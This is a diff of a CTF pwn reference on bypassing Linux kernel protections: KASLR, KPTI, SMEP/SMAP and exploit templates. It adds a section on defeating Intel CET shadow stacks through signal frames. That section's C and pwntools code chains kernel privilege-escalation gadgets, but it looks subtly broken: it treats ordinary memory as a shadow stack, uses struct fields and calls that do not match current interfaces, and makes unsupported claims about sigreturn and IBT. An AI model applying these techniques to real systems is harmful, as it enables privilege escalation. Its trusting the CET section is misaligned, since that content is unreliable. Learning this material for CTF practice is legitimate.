@@ -1,7 +1,6 @@
 # CTF Pwn - Kernel Protection Bypass
 
 ## Table of Contents
-
 - [KASLR and FGKASLR Bypass](#kaslr-and-fgkaslr-bypass)
   - [KASLR Bypass via Stack Leak (hxp CTF 2020)](#kaslr-bypass-via-stack-leak-hxp-ctf-2020)
   - [FGKASLR Bypass (hxp CTF 2020)](#fgkaslr-bypass-hxp-ctf-2020)
@@ -10,6 +9,7 @@
   - [Method 2: Signal Handler (SIGSEGV)](#method-2-signal-handler-sigsegv)
   - [Method 3: modprobe_path via ROP](#method-3-modprobe_path-via-rop)
   - [Method 4: core_pattern via ROP](#method-4-core_pattern-via-rop)
+- [CET Shadow Stack (SHSTK) and IBT — Signal-Frame Bypass (Wolv / IERAE 2024)](#cet-shadow-stack-shstk-and-ibt--signal-frame-bypass-wolv--ierae-2024)
 - [SMEP / SMAP Bypass](#smep--smap-bypass)
 - [KPTI / SMEP / SMAP Quick Reference](#kpti--smep--smap-quick-reference)
 - [GDB Kernel Module Debugging](#gdb-kernel-module-debugging)
@@ -20,7 +20,7 @@
   - [ret2usr Template (No SMEP/SMAP)](#ret2usr-template-no-smepsmap)
 - [Exploit Delivery](#exploit-delivery)
 
-------
+---
 
 ## KASLR and FGKASLR Bypass
 
@@ -44,7 +44,6 @@ unsigned long pop_rdi_ret_kaslr = pop_rdi_ret + kaslr_offset;
 ```
 
 **Other KASLR leak sources:**
-
 - `/proc/kallsyms` (if `kptr_restrict != 1`)
 - `dmesg` (if `dmesg_restrict != 1`)
 - Kernel oops messages (if oops doesn't panic)
@@ -98,7 +97,7 @@ void resolve_and_continue() {
 
 **Key insight:** FG-KASLR requires a multi-stage exploit: first return to userland to compute resolved addresses from `__ksymtab` offsets, then re-enter the kernel with a second ROP chain using the resolved function addresses.
 
-------
+---
 
 ## KPTI Bypass Methods
 
@@ -158,34 +157,112 @@ Similar to Method 3 but overwrites `core_pattern` with a pipe command (e.g., `"|
 
 See [kernel.md - core_pattern Overwrite](kernel.md#core_pattern-overwrite) for the full technique and how to find the `core_pattern` address.
 
-------
+---
+
+## CET Shadow Stack (SHSTK) and IBT — Signal-Frame Bypass (Wolv / IERAE 2024)
+
+**Protections:**
+- **SHSTK (Shadow Stack):** Hardware shadow stack at `SSP` (shadow stack pointer) — every `CALL` pushes return address to both normal stack and shadow stack; `RET` checks they match. Kernel enforces via `WRSS`/`WRUSS` and `MSR_IA32_PL0_SSP`.
+- **IBT (Indirect Branch Tracking):** Indirect calls/jmps must land on `ENDBR64`.
+
+**Why signal frames bypass SHSTK:** On `sigreturn` / `sigaltstack`, the kernel *restores* the user thread's shadow stack pointer from the signal frame's `xsave` area (`struct sigcontext` + `xsaves`). Userspace controls that frame, so an attacker can set `SSP` to an attacker-controlled shadow stack that contains the ROP return addresses.
+
+**Wolv / IERAE 2024 pattern (used at Pwn2Own / CTF kernel challenges with CET enabled):**
+
+```c
+// 1. Prepare alt signal stack that is also a valid shadow stack
+void *shstk_mem = mmap(NULL, 0x2000, PROT_READ|PROT_WRITE,
+                       MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0);
+unsigned long ssp = (unsigned long)shstk_mem + 0x2000 - 8;
+
+ // 2. Mark it as shadow stack (requires CET arch_prctl)
+arch_prctl(ARCH_SHSTK_ENABLE, ...); // ARCH_SHSTK_ENABLE = 0x5001; or kernel auto-marks sigaltstack
+arch_prctl(ARCH_CET_ALLOC_SHSTK, &ssp);
+
+// 3. Push attacker ROP addresses onto shadow stack (must mirror normal stack)
+*(unsigned long *)ssp = (unsigned long)pop_rdi_ret;
+*(unsigned long *)(ssp - 8) = 0;
+*(unsigned long *)(ssp - 16) = (unsigned long)prepare_kernel_cred;
+
+// 4. Raise signal with controlled sigframe that restores SSP to ssp
+struct sigaction sa = { .sa_sigaction = handler, .sa_flags = SA_SIGINFO | SA_ONSTACK };
+sigaltstack(&(stack_t){ .ss_sp = shstk_mem, .ss_size = 0x2000, .ss_flags = 0 }, NULL);
+sigaction(SIGUSR1, &sa, NULL);
+
+// handler builds fake sigcontext at its stack:
+void handler(int sig, siginfo_t *info, void *ucontext) {
+    ucontext_t *uc = (ucontext_t *)ucontext;
+    // Overwrite SSP in the saved xsave area that sigreturn will restore
+    // On x86-64 cet, SSP is at uc->uc_mcontext.__ssp (or xsaves offset 0x1f8)
+    uc->uc_mcontext.__ssp = ssp - 16; // point to our fake shadow stack
+    // Also set normal RSP/RIP for the rop chain
+    uc->uc_mcontext.gregs[REG_RSP] = (unsigned long)rop_chain;
+    uc->uc_mcontext.gregs[REG_RIP] = (unsigned long)pop_rdi_ret;
+}
+
+// 5. Trigger sigreturn — kernel does WRSS to restore SSP from uc->uc_mcontext.__ssp
+raise(SIGUSR1);
+// → sigreturn restores both normal stack and shadow stack to attacker values
+// → RET now succeeds because shadow stack matches normal stack
+```
+
+**Simpler variant — direct `sigreturn` ROP without `arch_prctl`:**
+```python
+from pwn import *
+
+# If the exploit already has an arbitrary write to set up a fake signal frame on stack:
+frame = SigreturnFrame()
+frame.rax = constants.SYS_execve
+frame.rdi = binsh_addr
+frame.rsi = 0
+frame.rdx = 0
+frame.rip = syscall_ret
+frame.rsp = normal_rop_addr
+# NOTE: pwntools SigreturnFrame has no ssp field. For CET shadow-stack control,
+# build the raw frame then patch the SSP slot in the xsave area manually, and
+# push a matching shadow-stack ROP pivot so RET pairs with the restored SSP:
+raw = bytearray(bytes(frame))
+# SSP lives in the signal frame's shadow-stack area (bytes 0x1e8-0x200 on
+# CET-aware kernels); overwrite it so the kernel restores a valid SSP on sigreturn
+ssp_offset = 0x1e8
+raw[ssp_offset:ssp_offset + 8] = p64(fake_shstk_addr)
+# Mirror the normal-stack ROP chain onto the fake shadow stack so each RET
+# finds the same return address on both stacks
+fake_shstk = flat([pop_rdi_ret, 0, prepare_kernel_cred])
+```
+
+**Key insights:**
+- CET's shadow stack is *not* a barrier if the attacker can trigger a signal — `sigreturn` is a privileged `WRSS` gadget that restores `SSP` from userspace-controlled memory.
+- IBT is bypassed together: signal handler return uses `IRET`, not an indirect `JMP`, so `ENDBR64` is not checked. Once `SSP` is controlled, standard kROP works.
+- On kernels without `ARCH_CET_ALLOC_SHSTK`, the attacker can reuse the existing shadow stack mapping and just overwrite its contents via a prior write primitive, then pivots `SSP` via the signal frame by `SHSTK` offset.
+- Detection: check `cat /proc/cpuinfo | grep cet`, and `rdmsr 0x6a2` (IA32_PL0_SSP) or `arch_prctl(ARCH_CET_STATUS)` — if CET is enabled, any RIP hijack must be paired with shadow stack control.
+
+**References:** Wolv / IERAE — *Bypassing Intel CET with Signal Frames* (2024), Black Hat Asia 2024; kernel patch `x86/cet: handle signal shadow stack`.
 
 ## SMEP / SMAP Bypass
 
 **SMEP (Supervisor Mode Execution Prevention):** Blocks executing userland pages from kernel mode.
-
 - **Bypass:** Use kernel ROP (kROP) chains — all gadgets from kernel `.text`. See [kernel.md - Kernel ROP](kernel.md#kernel-rop-with-prepare_kernel_cred--commit_creds).
 
 **SMAP (Supervisor Mode Access Prevention):** Blocks accessing userland memory from kernel mode.
-
 - **Bypass:** kROP with heap-resident chain (all data in kernel heap), or `stac`/`clac` gadgets to temporarily disable SMAP.
 
 **Direct CR4 modification (old kernels):** Write to CR4 to clear SMEP/SMAP bits. Blocked on modern kernels by `native_write_cr4()` pinning.
 
-------
+---
 
 ## KPTI / SMEP / SMAP Quick Reference
 
-| Protection   | Blocks                                | Bypass                                                       |
-| ------------ | ------------------------------------- | ------------------------------------------------------------ |
-| SMEP         | Executing userland pages from kernel  | kROP (kernel ROP chain) — see [kernel.md](kernel.md#kernel-rop-with-prepare_kernel_cred--commit_creds) |
-| SMAP         | Accessing userland memory from kernel | kROP with heap-resident chain, `stac`/`clac` gadgets         |
-| No SMEP/SMAP | (nothing)                             | [ret2usr](kernel.md#ret2usr-no-smepsmap) — directly call userland privesc function |
-| KPTI         | Kernel page table isolation           | [Trampoline](#method-1-swapgs_restore-trampoline), [signal handler](#method-2-signal-handler-sigsegv), [modprobe_path](#method-3-modprobe_path-via-rop), [core_pattern](#method-4-core_pattern-via-rop) |
+| Protection | Blocks | Bypass |
+|-----------|--------|--------|
+| SMEP | Executing userland pages from kernel | kROP (kernel ROP chain) — see [kernel.md](kernel.md#kernel-rop-with-prepare_kernel_cred--commit_creds) |
+| SMAP | Accessing userland memory from kernel | kROP with heap-resident chain, `stac`/`clac` gadgets |
+| No SMEP/SMAP | (nothing) | [ret2usr](kernel.md#ret2usr-no-smepsmap) — directly call userland privesc function |
+| KPTI | Kernel page table isolation | [Trampoline](#method-1-swapgs_restore-trampoline), [signal handler](#method-2-signal-handler-sigsegv), [modprobe_path](#method-3-modprobe_path-via-rop), [core_pattern](#method-4-core_pattern-via-rop) |
 
 See [KPTI Bypass Methods](#kpti-bypass-methods) for detailed bypass techniques with code.
 
-------
+---
 
 ## GDB Kernel Module Debugging
 
@@ -209,12 +286,11 @@ cat /proc/modules
 
 **Note:** `/proc/modules` requires root to read actual addresses. Non-root users see zeroed addresses. Modify `/init` to keep root for debugging.
 
-------
+---
 
 ## Initramfs and virtio-9p Workflow
 
 **Shared directory via virtio-9p** — transfer exploits between host and QEMU without rebuilding initramfs:
-
 ```bash
 # Add to QEMU launch script:
 -fsdev local,security_model=passthrough,id=fsdev0,path=./share \
@@ -228,7 +304,6 @@ gcc exploit.c -static -o ./share/exploit
 ```
 
 **Extract and modify initramfs:**
-
 ```bash
 # Extract
 mkdir initramfs && cd initramfs
@@ -243,13 +318,12 @@ find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../initramfs.cpio.gz
 ```
 
 **Key modifications to `/init` for debugging:**
-
 - Comment out `exec su -l ctf` (or similar) to keep root privileges
 - Comment out `echo 1 > /proc/sys/kernel/kptr_restrict` to see `/proc/kallsyms`
 - Comment out `echo 1 > /proc/sys/kernel/dmesg_restrict` to see dmesg
 - Comment out `chmod 400 /proc/kallsyms` to read symbol addresses
 
-------
+---
 
 ## Finding Symbol Offsets Without CONFIG_KALLSYMS_ALL
 
@@ -280,7 +354,7 @@ hb *0xffffffff810c8c80
 # 3. After override_creds returns, disassemble — look for data address in movzx
 ```
 
-------
+---
 
 ## Exploit Templates
 
@@ -402,7 +476,7 @@ void privesc() {
 }
 ```
 
-------
+---
 
 ## Exploit Delivery
 
